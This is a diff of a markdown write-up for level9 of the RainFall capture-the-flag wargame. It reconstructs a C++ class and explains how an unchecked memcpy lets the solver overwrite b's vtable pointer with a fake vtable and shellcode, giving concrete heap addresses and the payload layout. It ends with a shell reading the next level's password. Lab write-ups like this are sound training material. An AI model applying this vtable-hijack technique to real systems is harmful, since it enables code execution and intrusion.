@@ -1,86 +1,76 @@
 ## level9
 
-```console
-(gdb) i fun N::
-All functions matching regular expression "N::":
+This is the first C++ level.
 
-Non-debugging symbols:
-0x080486f6  N::N(int)
-0x080486f6  N::N(int)
-0x0804870e  N::setAnnotation(char*)
-0x0804873a  N::operator+(N&)
-0x0804874e  N::operator-(N&)
-(gdb) disas main
-Dump of assembler code for function main:
-   0x080485f4 <+0>:     push   ebp
-   0x080485f5 <+1>:     mov    ebp,esp
-   0x080485f7 <+3>:     push   ebx
-   0x080485f8 <+4>:     and    esp,0xfffffff0
-   0x080485fb <+7>:     sub    esp,0x20
-   0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1
-   0x08048602 <+14>:    jg     0x8048610 <main+28>
-   0x08048604 <+16>:    mov    DWORD PTR [esp],0x1
-   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
-   0x08048610 <+28>:    mov    DWORD PTR [esp],0x6c
-   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
-   0x0804861c <+40>:    mov    ebx,eax
-   0x0804861e <+42>:    mov    DWORD PTR [esp+0x4],0x5
-   0x08048626 <+50>:    mov    DWORD PTR [esp],ebx
-   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
-   0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx
-   0x08048632 <+62>:    mov    DWORD PTR [esp],0x6c
-   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
-   0x0804863e <+74>:    mov    ebx,eax
-   0x08048640 <+76>:    mov    DWORD PTR [esp+0x4],0x6
-   0x08048648 <+84>:    mov    DWORD PTR [esp],ebx
-   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
-   0x08048650 <+92>:    mov    DWORD PTR [esp+0x18],ebx
-   0x08048654 <+96>:    mov    eax,DWORD PTR [esp+0x1c]
-   0x08048658 <+100>:   mov    DWORD PTR [esp+0x14],eax
-   0x0804865c <+104>:   mov    eax,DWORD PTR [esp+0x18]
-   0x08048660 <+108>:   mov    DWORD PTR [esp+0x10],eax
-   0x08048664 <+112>:   mov    eax,DWORD PTR [ebp+0xc]
-   0x08048667 <+115>:   add    eax,0x4
-   0x0804866a <+118>:   mov    eax,DWORD PTR [eax]
-   0x0804866c <+120>:   mov    DWORD PTR [esp+0x4],eax
-   0x08048670 <+124>:   mov    eax,DWORD PTR [esp+0x14]
-   0x08048674 <+128>:   mov    DWORD PTR [esp],eax
-   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
+```cpp
+
+class N {
+  public:
+    N(int value) : _value(value) {}
+
+    void setAnnotation(const char* text) {
+        std::memcpy(_annotation, text, std::strlen(text));
+    }
+
+    int operator+(const N& other) { return this->_value + other._value; }
+    int operator-(const N& other) { return this->_value - other._value; }
+
+    // at least one virtual method
+
+  private:
+    // 4 bytes here for the vtable
+    char _annotation[100];
+    int _value;
+};
+
+int main(int argc, char** argv) {
+    if (argc < 2) std::exit(1);
+
+    N* a = new N(5);
+    N* b = new N(6);
+
+    a->setAnnotation(argv[1]);
+    return *b + *a;
+}
+```
+
+A buffer overflow is available through `memcpy`, since the length of `text` is not checked. We'll use
+
+> In computer programming, a virtual method table (VMT), virtual function table, virtual call table, dispatch table, vtable, or vftable is a mechanism used in a programming language to support dynamic dispatch (or run-time method binding).
+> Whenever a class defines a virtual function (or method), most compilers add a hidden member variable to the class that points to an array of pointers to (virtual) functions called the virtual method table. These pointers are used at runtime to invoke the appropriate function implementations, because at compile time it may not yet be known if the base function is to be called or a derived one implemented by a class that inherits from the base class. 
+> -- https://en.wikipedia.org/wiki/Virtual_method_table
+
+This part of the assembly shows the use of a vtable. First we get `b`, then its first element (which is the vtable for classes with at least one virtual method) is read, then the first function of the vtable is called.
+
+```nasm
    0x0804867c <+136>:   mov    eax,DWORD PTR [esp+0x10]
    0x08048680 <+140>:   mov    eax,DWORD PTR [eax]
    0x08048682 <+142>:   mov    edx,DWORD PTR [eax]
-   0x08048684 <+144>:   mov    eax,DWORD PTR [esp+0x14]
-   0x08048688 <+148>:   mov    DWORD PTR [esp+0x4],eax
-   0x0804868c <+152>:   mov    eax,DWORD PTR [esp+0x10]
-   0x08048690 <+156>:   mov    DWORD PTR [esp],eax
+[...]
    0x08048693 <+159>:   call   edx
-   0x08048695 <+161>:   mov    ebx,DWORD PTR [ebp-0x4]
-   0x08048698 <+164>:   leave  
-   0x08048699 <+165>:   ret    
-End of assembler dump.
-(gdb) x/wx $esp+0x1c
-0xbffff72c:     0x0804a008
-(gdb) x/wx $esp+0x18 
-0xbffff728:     0x08048779
 ```
 
-We override the first entry of a's vtable.
+We want to override the first entry of b's vtable. To do so, we'll write a shellcode in `a->_annotation`
 
+```
 (gdb) p/x *(void **)( $esp + 0x14 )
 $1 = 0x804a008
-(gdb) p/x *(void **)( $esp + 0x10 )
-$2 = 0x804a078
+```
 
-a = 0x0804a008
-a->_annotation = 0x0804a00c
-b malloc header = 0x0804a074
-b = 0x08048779
-b->_annotation = 0x0804877d
-N::operator+ = 0x0804873a
+`a` = 0x0804a008
+`a->_annotation` = 0x0804a00c
+`a->_annotation + 4` (address of the shellcode) = 0x0804a010
 
-`./level9.sh | tr -d '\n' | python -c 'print(open(0, "rb").read())' ; python level9.py`
+The payload written in `a->_annotation`:
+- address of the shellcode
+- shellcode
+- padding to reach `b`'s vtable
+- address of `a->_annotation`
+
+On the next line, `*b + *a` is going to be executed. It will jump to `a->_annotation` instead of `b`'s vtable, then when our fake vtable will point to the shellcode, which is going to be executed.
 
 ```console
+level9@RainFall:~$ ./level9 $(python /tmp/level9.py)
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
